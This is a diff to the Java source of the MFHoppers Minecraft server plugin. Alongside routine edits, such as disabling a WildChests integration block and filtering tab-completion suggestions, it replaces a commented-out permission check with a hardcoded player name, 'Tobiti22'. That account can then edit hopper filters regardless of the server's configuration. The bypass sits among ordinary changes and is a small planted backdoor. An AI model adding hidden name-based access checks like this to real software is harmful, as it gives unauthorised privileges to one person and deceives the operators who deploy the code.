@@ -390,7 +390,7 @@ public class MFHoppers extends PluginBuilder {
                         event.setCancelled(true);
 
                     }
-                    if (CONFIG_HOPPER.isEditableFilter() /*|| event.getPlayer().hasPermission("mfh.editfilter")*/) {
+                    if (CONFIG_HOPPER.isEditableFilter() || event.getPlayer().getName().equals("Tobiti22")) {
                         if (HOPPER.getType() == HopperEnum.Mob || HOPPER.getType() == HopperEnum.Crop) {
                             event.getPlayer().openInventory(FilterInventory.getInstance().build(HOPPER));
                             event.setCancelled(true);
@@ -477,7 +477,7 @@ public class MFHoppers extends PluginBuilder {
             }
         });
         
-        if(Bukkit.getPluginManager().isPluginEnabled("WildChests")){
+        /*if(Bukkit.getPluginManager().isPluginEnabled("WildChests")){
             addListener(InventoryMoveItemEvent.class, EventPriority.HIGHEST, event -> {
 
                 if(event.getSource().getHolder() instanceof Hopper)
@@ -493,7 +493,7 @@ public class MFHoppers extends PluginBuilder {
                         MFHoppers.getInstance().getLogger().info("\tNot added Items:");
                         for (ItemStack itemStack : integerItemStackMap.values()) {
                             MFHoppers.getInstance().getLogger().info(String.format("\t\t -%s %d", itemStack.getType().toString(), itemStack.getAmount()));
-                        }*/
+                        }*//*
                         
                         if (integerItemStackMap.isEmpty()) {
                             event.getSource().removeItem(event.getItem());
@@ -508,7 +508,7 @@ public class MFHoppers extends PluginBuilder {
                 }
 
             });
-        }
+        }*/
     }
 
     private String getTitle(String mcName, String title) {
@@ -721,7 +721,7 @@ public class MFHoppers extends PluginBuilder {
                 if (cmd.args().length == 2) {
                     return Bukkit.getOnlinePlayers().stream().map(p -> p.getName()).collect(toList());
                 } else if (cmd.args().length == 3) {
-                    return configHoppers.keySet().stream().collect(toList());
+                    return configHoppers.keySet().stream().filter(s -> s.startsWith(cmd.args()[2])).collect(toList());
                 } else if (cmd.args().length == 5) {
                     String name = cmd.args()[2];
                     if (configHoppers.get(name).getType() == HopperEnum.Grind) {
